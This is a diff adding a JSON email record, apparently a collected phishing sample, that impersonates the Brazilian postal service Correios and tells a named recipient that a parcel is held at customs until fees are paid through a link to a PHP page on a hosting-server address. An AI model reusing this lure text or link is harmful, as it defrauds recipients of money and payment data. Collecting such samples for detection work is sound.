@@ -1,0 +1,15 @@
+{
+  "id": "AQMkADAwATYwMAItZTJmYi02MzkyLTAwAi0wMAoARgAAA1iCvvzIkRlArc6mb4N6iyYHAOZ4XLKB7bVKo3gm1yGHeLUAAAIBIQAAAOZ4XLKB7bVKo3gm1yGHeLUACLfGcEEAAAA=",
+  "subject": "Seu pedido foi taxado e bloqueado pela fiscalização alfandegária - Protocolo: 0331",
+  "from": {
+    "EmailAddress": {
+      "address": "CORREIOS_BRASIL@seguranca42761"
+    }
+  },
+  "toRecipients": {
+    "recipients": null
+  },
+  "body": {
+    "content": "\u003chtml lang=\"pt-BR\"\u003e\u003chead\u003e\r\n\u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"\u003e\u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e\u003cstyle\u003e\r\n\u003c!--\r\nbody\r\n\t{font-family:Arial,sans-serif;\r\n\tmargin:0;\r\n\tpadding:0;\r\n\tbackground-color:#f4f4f4}\r\n.email-container\r\n\t{max-width:600px;\r\n\tmargin:0 auto;\r\n\tbackground-color:#ffffff;\r\n\tborder:1px solid #ddd;\r\n\tborder-radius:8px;\r\n\toverflow:hidden}\r\n.header\r\n\t{background-color:#ffcc00;\r\n\tpadding:20px;\r\n\ttext-align:center;\r\n\tfont-size:24px;\r\n\tfont-weight:bold;\r\n\tcolor:#003366}\r\n.body\r\n\t{padding:20px;\r\n\tcolor:#333333;\r\n\tline-height:1.5}\r\n.button-container\r\n\t{text-align:center;\r\n\tmargin:20px 0}\r\n.button\r\n\t{display:inline-block;\r\n\ttext-decoration:none;\r\n\tbackground-color:#003366;\r\n\tcolor:#ffffff;\r\n\tpadding:15px 20px;\r\n\tborder-radius:4px;\r\n\tfont-weight:bold;\r\n\tfont-size:16px}\r\n.footer\r\n\t{background-color:#003366;\r\n\tcolor:#ffffff;\r\n\ttext-align:center;\r\n\tpadding:10px;\r\n\tfont-size:12px}\r\n--\u003e\r\n\u003c/style\u003e\u003c/head\u003e\u003cbody\u003e\u003cdiv class=\"email-container\"\u003e\u003cdiv class=\"header\"\u003eNotificação de Encomenda Retida \u003c/div\u003e\u003cdiv class=\"body\"\u003e\u003cp\u003eOlá, \u003cstrong\u003eitalontab@hotmail.com \u003c/strong\u003e,\u003c/p\u003e\u003cp\u003eSeu pedido foi temporariamente bloqueado pela alfândega devido à pendência no pagamento de taxas obrigatórias.\u003c/p\u003e\u003cp\u003ePara evitar o cancelamento da entrega, regularize o pagamento das taxas no prazo de 3 dias úteis.\u003c/p\u003e\u003cp\u003eClique no botão abaixo para acessar o portal de pagamento e liberar sua entrega:\u003c/p\u003e\u003cdiv class=\"button-container\"\u003e\u003ca href=\"http://90.225.167.72.host.secureserver.net/tt6.php/\" class=\"button\"\u003eEfetuar Pagamento\u003c/a\u003e \u003c/div\u003e\u003c/div\u003e\u003cdiv class=\"footer\"\u003e© Correios 2025 - Todos os direitos reservados\u003cbr\u003eEste é um e-mail automático. Não responda a esta mensagem. \u003c/div\u003e\u003c/div\u003e\u003c/body\u003e\u003c/html\u003e"
+  }
+}
